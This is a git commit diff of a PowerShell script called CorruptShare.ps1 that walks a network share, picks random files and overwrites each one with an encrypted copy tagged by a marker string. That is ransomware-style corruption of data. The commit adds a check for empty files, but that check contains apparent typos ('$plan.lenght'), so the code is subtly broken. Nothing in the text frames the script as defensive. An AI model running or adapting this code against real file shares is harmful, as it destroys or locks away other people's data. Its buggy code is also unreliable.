27cd79dbd9b6059dc9707f7fbacd67c62de91969
Will Perry <wfperry1@gmail.com>
2022-06-14 14:15:19 -0400

    Updates CorrupShare to handle empty files.

--- CorruptShare.ps1
+++ CorruptShare.ps1
@@ -8,8 +8,8 @@
 		$files = Get-ChildItem -Path $Share -Recurse | Select-Object FullName;
 		if ($files.length -gt 0) {
             $sample = $files | Get-Random -Count 1;
-            $plain = [System.Text.Encoding]::ASCII.GetString((Get-Content -Encoding byte -TotalCount 60000 "${Share}\${sample}"));
-            if ($plain.Substring(0,$semaphore.length) -ne $semaphore) {
+            $plain = Get-Content -Force -Encoding byte -TotalCount 60000 $sample.FullName;
+            if (($plan.lenght -gt 0) -and ($plain.Substring(0,$semaphore.length) -ne $semaphore)) {
                 $encrypt = ConvertFrom-SecureString -SecureString (ConvertTo-SecureString $plain -AsPlainText -Force) -Key $key
                 Set-Content -Path $sample -value "${semaphore}${encrypt}";
 			    Write-Host $sample;
